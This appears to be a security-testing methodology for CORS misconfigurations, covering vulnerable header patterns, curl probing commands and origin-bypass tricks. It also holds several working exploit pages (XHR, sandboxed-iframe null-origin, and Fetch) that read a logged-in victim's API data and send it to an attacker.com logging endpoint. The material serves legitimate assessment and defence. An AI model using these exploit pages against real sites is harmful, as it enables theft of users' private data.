# CORS Misconfiguration Testing Methodology

## Quick Reference

**Vulnerable Configurations:**
```
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Origin: null
Access-Control-Allow-Origin: * (with credentials)
```

**Test Headers:**
```
Origin: https://attacker.com
Origin: null
Origin: https://target.com.attacker.com
```

---

## CORS Basics

CORS (Cross-Origin Resource Sharing) controls cross-origin requests. Key headers:

**Response Headers:**
- `Access-Control-Allow-Origin` - Allowed origins
- `Access-Control-Allow-Credentials` - Allow cookies
- `Access-Control-Allow-Methods` - Allowed methods
- `Access-Control-Allow-Headers` - Allowed headers
- `Access-Control-Expose-Headers` - Exposed headers

---

## Vulnerable Patterns

### Pattern 1: Reflected Origin

Server reflects any Origin header:

```
Request:
Origin: https://attacker.com

Response:
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```

**Risk:** Attacker can read authenticated responses.

### Pattern 2: Null Origin Allowed

```
Request:
Origin: null

Response:
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

**Risk:** Sandboxed iframes and data: URLs have null origin.

### Pattern 3: Regex Bypass

Weak regex validation:

```
# If regex: ^https://.*\.target\.com$
Origin: https://attacker.target.com    ✗ Blocked
Origin: https://attackertarget.com     ✓ Might pass

# If regex: target\.com
Origin: https://target.com.attacker.com  ✓ Might pass
```

### Pattern 4: Subdomain Wildcard

```
Access-Control-Allow-Origin: *.target.com
```

If any subdomain has XSS, can escalate to CORS exploitation.

### Pattern 5: Whitelist Bypass

```
# If whitelist checks "contains"
Origin: https://target.com.attacker.com
Origin: https://attacker.com?target.com
Origin: https://attacker.com#target.com
```

### Pattern 6: Protocol Downgrade

```
# If HTTPS allowed, try HTTP
Origin: http://target.com
```

---

## Testing Methodology

### Step 1: Check for CORS Headers

```bash
curl -I -H "Origin: https://attacker.com" https://target.com/api/data
```

Look for:
- `Access-Control-Allow-Origin`
- `Access-Control-Allow-Credentials`

### Step 2: Test Origin Reflection

```bash
# Test arbitrary origin
curl -H "Origin: https://evil.com" https://target.com/api

# Test null origin
curl -H "Origin: null" https://target.com/api
```

### Step 3: Test Regex Bypass

```bash
# Prefix
curl -H "Origin: https://attackertarget.com" https://target.com/api

# Suffix
curl -H "Origin: https://target.com.attacker.com" https://target.com/api

# Special characters
curl -H "Origin: https://target.com%60.attacker.com" https://target.com/api
```

### Step 4: Test Subdomain

```bash
curl -H "Origin: https://subdomain.target.com" https://target.com/api
```

### Step 5: Test Protocol

```bash
curl -H "Origin: http://target.com" https://target.com/api
```

---

## Exploitation

### Basic Exploit

```html
<!DOCTYPE html>
<html>
<body>
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://target.com/api/sensitive-data", true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {
  if (xhr.readyState == 4) {
    // Send data to attacker
    fetch("https://attacker.com/log?data=" + encodeURIComponent(xhr.responseText));
    document.body.innerHTML = xhr.responseText;
  }
};
xhr.send();
</script>
</body>
</html>
```

### Null Origin Exploit

Use sandboxed iframe:

```html
<!DOCTYPE html>
<html>
<body>
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.com/api/sensitive-data', true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {
  if (xhr.readyState == 4) {
    fetch('https://attacker.com/log?data=' + encodeURIComponent(xhr.responseText));
  }
};
xhr.send();
</script>
"></iframe>
</body>
</html>
```

Or use data: URL:
```html
<iframe src="data:text/html,<script>...</script>">
```

### Fetch API Exploit

```javascript
fetch("https://target.com/api/sensitive-data", {
  credentials: "include"
})
.then(response => response.text())
.then(data => {
  fetch("https://attacker.com/log?data=" + encodeURIComponent(data));
});
```

---

## Advanced Techniques

### Preflight Bypass

Simple requests don't trigger preflight:
- Methods: GET, HEAD, POST
- Safe headers only
- Content-Type: text/plain, application/x-www-form-urlencoded, multipart/form-data

```javascript
// Avoid preflight
fetch("https://target.com/api", {
  method: "POST",
  headers: {
    "Content-Type": "text/plain"
  },
  credentials: "include",
  body: JSON.stringify({action: "read"})
});
```

### Exploiting Vary Header

If response lacks `Vary: Origin`:
- Cached responses might be served with wrong CORS headers
- Cache poisoning possible

### Chained with XSS

If subdomain allows wildcard and has XSS:

1. Find XSS on `sub.target.com`
2. Use XSS to make request to `target.com`
3. Since same-site, CORS allows it

---

## Common Misconfigurations

### Development/Debug Settings

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: *
Access-Control-Allow-Headers: *
```

### Wildcard with Credentials

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

This is actually blocked by browsers but indicates misconfiguration.

### Overly Permissive Regex

```javascript
// Bad: Allows attacker.target.com.evil.com
if (origin.includes("target.com"))

// Bad: Allows attackertarget.com
if (origin.endsWith("target.com"))
```

---

## Impact Assessment

### With Credentials

If `Access-Control-Allow-Credentials: true`:
- Read authenticated user data
- Access private APIs
- Potential account compromise

### Without Credentials

If no credentials:
- Read public data
- Less severe but still information disclosure

---

## Browser Behavior

### Same-Origin Policy

By default, browsers block:
- Reading cross-origin responses
- Sending certain headers/methods cross-origin

### CORS Relaxation

CORS headers tell browser to relax restrictions for specific origins.

---

## Verification Checklist

1. **Identify CORS endpoints:**
   - [ ] Check API responses for CORS headers
   - [ ] Note which endpoints return sensitive data

2. **Test origin reflection:**
   - [ ] Arbitrary origin
   - [ ] Null origin
   - [ ] Subdomain variations

3. **Test regex bypass:**
   - [ ] Prefix/suffix attacks
   - [ ] Special character injection

4. **Confirm credentials:**
   - [ ] Check `Access-Control-Allow-Credentials`
   - [ ] Test with `withCredentials: true`

5. **Create PoC:**
   - [ ] Build exploit page
   - [ ] Demonstrate data exfiltration

6. **Document evidence:**
   - [ ] Request/response showing misconfiguration
   - [ ] Working exploit
   - [ ] Sensitive data accessed
